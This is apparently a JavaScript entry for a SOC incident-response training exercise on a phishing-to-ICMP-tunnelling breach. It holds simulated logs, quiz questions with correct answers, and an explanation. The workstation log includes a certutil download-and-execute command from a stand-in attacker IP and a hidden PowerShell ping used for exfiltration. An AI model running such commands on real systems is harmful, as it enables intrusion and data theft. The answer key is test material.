scenarios.push({
        id: "ir-scenario-2026-icmp-tunnel",
        title: "Operation Dark Echo: ICMP Tunneling",
        description: "Unusual volume of high-payload ICMP Echo Requests observed communicating with an unclassified external IP address.",
        logs: {
            proxy: [
                "2026-05-29T08:02:14Z - IP: 192.168.10.10 - URL: https://identity.okta.com/oauth2 - Action: Allowed - Category: Identity Provider - Bytes: 1450",
                "2026-05-29T08:03:45Z - IP: 192.168.10.10 - URL: https://slack.com/api/rtm.start - Action: Allowed - Category: Business/Collaboration - Bytes: 4092",
                "2026-05-29T08:05:22Z - IP: 192.168.10.14 - URL: https://github.com/company-org/repo - Action: Allowed - Category: IT/Development - Bytes: 12300",
                "2026-05-29T08:15:32Z - IP: 192.168.10.112 - URL: https://identity.okta.com/oauth2 - Action: Allowed - Category: Identity Provider - Bytes: 1410",
                "2026-05-29T08:16:45Z - IP: 192.168.10.112 - URL: https://outlook.office.com/mapi - Action: Allowed - Category: Business/Collaboration - Bytes: 8940",
                "2026-05-29T08:22:20Z - IP: 192.168.10.112 - URL: http://198.51.100.42/sysprep_patch.exe - Action: Allowed - Category: IP-Address-Direct - Bytes: 2450000",
                "2026-05-29T08:30:00Z - IP: 192.168.10.12 - URL: https://teams.microsoft.com - Action: Allowed - Category: Business/Collaboration - Bytes: 12450",
                "2026-05-29T08:40:00Z - IP: 192.168.10.112 - Proto: ICMP/Type 8 (Echo Request) - Dest: 203.0.113.84 - Status: Allowed - Payload: 1450 bytes",
                "2026-05-29T08:40:15Z - IP: 192.168.10.112 - Proto: ICMP/Type 8 (Echo Request) - Dest: 203.0.113.84 - Status: Allowed - Payload: 1450 bytes",
                "2026-05-29T08:40:30Z - IP: 192.168.10.112 - Proto: ICMP/Type 8 (Echo Request) - Dest: 203.0.113.84 - Status: Allowed - Payload: 1450 bytes",
                "2026-05-29T08:45:12Z - IP: 192.168.10.14 - URL: https://stackoverflow.com/questions - Action: Allowed - Category: IT/Development - Bytes: 7800",
                "2026-05-29T08:50:00Z - IP: 192.168.10.112 - Proto: ICMP/Type 8 (Echo Request) - Dest: 203.0.113.84 - Status: Allowed - Payload: 1450 bytes",
                "2026-05-29T08:55:40Z - IP: 192.168.10.112 - Proto: TCP/5985 (WinRM) - Dest: 192.168.10.115 - Action: Allowed - Internal Traffic",
                "2026-05-29T09:02:40Z - IP: 192.168.10.115 - Proto: ICMP/Type 8 (Echo Request) - Dest: 203.0.113.84 - Status: Allowed - Payload: 1450 bytes",
                "2026-05-29T09:02:55Z - IP: 192.168.10.115 - Proto: ICMP/Type 8 (Echo Request) - Dest: 203.0.113.84 - Status: Allowed - Payload: 1450 bytes",
                "2026-05-29T09:05:00Z - IP: 192.168.10.112 - Proto: ICMP/Type 8 (Echo Request) - Dest: 203.0.113.84 - Status: Allowed - Payload: 1450 bytes",
                "2026-05-29T09:12:00Z - IP: 192.168.10.10 - URL: https://canva.com/design - Action: Allowed - Category: Media/Arts - Bytes: 320000"
            ],
            email: [
                "2026-05-29T08:00:10Z - Inbound - From: notifications@slack.com - To: asmith@company.com - Subject: Daily Team Sync - Status: Delivered",
                "2026-05-29T08:15:30Z - Inbound - From: invoice-service@vendor-billing-portal.com - To: tturner@company.com - Subject: Outstanding_Invoice_Q2 - Attachment: Outstanding_Invoice_Q2.pdf - Status: Delivered",
                "2026-05-29T08:45:00Z - Inbound - From: alerts@bamboohr.com - To: tturner@company.com - Subject: Review Request Submitted - Status: Delivered",
                "2026-05-29T09:15:00Z - Outbound - From: fsmith@company.com - To: payroll-external@taxpartner.com - Subject: Audited Q2 Payroll Ledger - Status: Sent"
            ],
            file_server: [
                "2026-05-29T08:20:15Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.10 - User: COMPANY\\asmith",
                "2026-05-29T08:32:02Z - Share Name: \\\\FILE-SRV-01\\Finance - Access Request: Allowed - Source IP: 192.168.10.12 - User: COMPANY\\fsmith",
                "2026-05-29T08:35:10Z - Object Accessed: \\\\FILE-SRV-01\\Archive\\2026_Tax_Disclosures.zip - Accesses: ReadData - Source IP: 192.168.10.112 - User: COMPANY\\tturner",
                "2026-05-29T08:50:00Z - Share Name: \\\\FILE-SRV-01\\Public - Access Request: Allowed - Source IP: 192.168.10.15 - User: COMPANY\\jdoe"
            ],
            workstations: [
                "2026-05-29T08:07:12Z - WKSTN-03 (192.168.10.14) - Command executed: ping 192.168.10.1 -n 4 - Payload Size: 32 bytes",
                "2026-05-29T08:15:10Z - WKSTN-12 (192.168.10.112) - EventID: 4688 - Process Created: explorer.exe spawned outlook.exe",
                "2026-05-29T08:22:15Z - WKSTN-12 (192.168.10.112) - EventID: 4688 - Process Created: outlook.exe spawned Acrobat.exe --open Outstanding_Invoice_Q2.pdf",
                "2026-05-29T08:22:18Z - WKSTN-12 (192.168.10.112) - EventID: 4688 - Process Created: Acrobat.exe spawned cmd.exe /c certutil.exe -urlcache -f http://198.51.100.42/sysprep_patch.exe C:\\Windows\\Temp\\sysprep_patch.exe",
                "2026-05-29T08:24:00Z - WKSTN-12 (192.168.10.112) - EventID: 4688 - Process Created: cmd.exe spawned C:\\Windows\\Temp\\sysprep_patch.exe",
                '2026-05-29T09:02:30Z - WKSTN-15 (192.168.10.115) - EventID: 4688 - Process Created: wsmprovhost.exe spawned powershell.exe -WindowStyle Hidden -Command "[System.Net.NetworkInformation.Ping]::new().Send(\'203.0.113.84\', ...)"'
            ],
            auth_logs: [
                "2026-05-29T08:05:00Z - WKSTN-03 (192.168.10.14) - EventID: 4624 - Successful Logon - User: COMPANY\\rjones - Logon Type: 2 (Interactive)",
                "2026-05-29T08:12:00Z - WKSTN-01 (192.168.10.10) - EventID: 4624 - Successful Logon - User: COMPANY\\asmith - Logon Type: 2 (Interactive)",
                "2026-05-29T08:14:50Z - IdP_Auth - User: tturner@company.com - App: Exchange Online - AuthMethod: Password+MFA - Status: Success - Agent: Microsoft Outlook for Windows",
                "2026-05-29T08:14:55Z - WKSTN-12 (192.168.10.112) - EventID: 4624 - Successful Logon - User: COMPANY\\tturner - Logon Type: 2 (Interactive)",
                "2026-05-29T08:30:15Z - WKSTN-02 (192.168.10.12) - EventID: 4624 - Successful Logon - User: COMPANY\\fsmith - Logon Type: 2 (Interactive)",
                "2026-05-29T08:55:10Z - WKSTN-15 (192.168.10.115) - EventID: 4624 - Successful Network Logon - Source IP: 192.168.10.112 - User: COMPANY\\Administrator - Logon Type: 3 (Network via WinRM)"
            ]
        },
        questions: {
            vector: {
                label: "What was the initial entry mechanism (attack vector) used to breach the corporate environment?",
                type: "select",
                options: [
                    "Unauthenticated Remote Code Execution over VPN",
                    "Phishing Email with Malicious Attachment",
                    "Compromised Software Update Package (Supply Chain)",
                    "Social Engineering leading to Credential Harvesting"
                ],
                correct: "Phishing Email with Malicious Attachment"
            },
            origin: {
                label: "Identify Patient Zero (Point of Origin) where the initial payload was downloaded and executed:",
                type: "select",
                options: [
                    "WKSTN-03",
                    "WKSTN-01",
                    "WKSTN-12",
                    "WKSTN-15"
                ],
                correct: "WKSTN-12"
            },
            count: {
                label: "How many endpoint systems show evidence of active compromise/C2 exfiltration?",
                type: "number",
                correct: 2
            },
            beaconing: {
                label: "Which protocol and anomalous traffic characteristic are used by the attacker for stealth exfiltration?",
                type: "select",
                options: [
                    "DNS TXT Query Subdomain Encrypted Tunneling",
                    "Oversized Outbound ICMP Echo Requests (1450 Bytes)",
                    "Outbound WinRM Management Shell Traffic on TCP 5985",
                    "Direct SSH File Exfiltration using Encoded Keys"
                ],
                correct: "Oversized Outbound ICMP Echo Requests (1450 Bytes)"
            },
            lateral_movement: {
                label: "Which native administrative protocol was leveraged to execute lateral movement from Patient Zero?",
                type: "select",
                options: [
                    "Remote Desktop Protocol (RDP) on TCP 3389",
                    "Server Message Block (SMB) administrative shares",
                    "Windows Remote Management (WinRM) on TCP 5985",
                    "WMI execution via Win32_Process class"
                ],
                correct: "Windows Remote Management (WinRM) on TCP 5985"
            }
        },
        principles: ["Phishing / Social Engineering", "ICMP Tunneling / Beaconing", "Lateral Movement", "Beaconing / Command & Control"],
        explanation: "An analysis of incoming email telemetry indicates that at 08:15:30Z, user 'tturner' on WKSTN-12 received a phishing message containing a PDF invoice attachment. Upon opening the PDF at 08:22:15Z, an Adobe exploit launched a hidden shell command leveraging certutil.exe to download 'sysprep_patch.exe' from an external IP staging server. The malware used ICMP Tunneling to bypass traditional web proxies by wrapping stolen data into 1450-byte Echo Requests directed to 203.0.113.84. After staging and exfiltrating '2026_Tax_Disclosures.zip' from the FILE-SRV-01 archive folder, the attacker harvested credentials from LSASS and successfully pivoted laterally to WKSTN-15 at 08:55:10Z using Windows Remote Management (WinRM / TCP port 5985), leading to a secondary payload activation. Meanwhile, background noise from other users (such as rjones troubleshooting network routes using legitimate, normal 32-byte internal pings) provides the typical administrative distraction present in real-world SOC workflows."
    });
